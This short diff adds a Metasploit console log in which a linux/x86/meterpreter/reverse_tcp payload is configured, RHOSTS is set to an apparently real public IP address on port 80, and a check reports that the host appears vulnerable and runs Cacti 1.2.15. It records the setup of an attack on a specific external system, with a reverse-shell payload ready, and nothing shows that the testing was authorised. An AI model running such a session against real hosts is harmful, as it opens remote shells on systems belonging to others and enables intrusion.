@@ -1,0 +1,6 @@
+This copy of metasploit-framework is more than two weeks old.
+ Consider running 'msfupdate' to update to the latest version.
+[*] Using configured payload linux/x86/meterpreter/reverse_tcp
+RHOSTS => 182.253.23.12
+RPORT => 80
+[*] 182.253.23.12:80 - The target appears to be vulnerable. The target is Cacti version 1.2.15
